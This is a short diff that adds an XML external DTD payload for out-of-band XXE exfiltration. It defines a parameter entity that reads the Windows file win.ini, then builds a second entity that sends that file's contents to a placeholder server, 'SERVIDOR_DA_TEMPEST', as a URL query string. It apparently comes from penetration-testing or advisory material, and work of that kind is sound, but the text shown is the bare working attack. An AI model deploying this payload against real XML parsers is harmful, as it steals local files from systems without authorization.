@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:C:\windows\win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM
+'http://SERVIDOR_DA_TEMPEST/?x=%file;'>">↪→
+%eval;
+%exfiltrate;
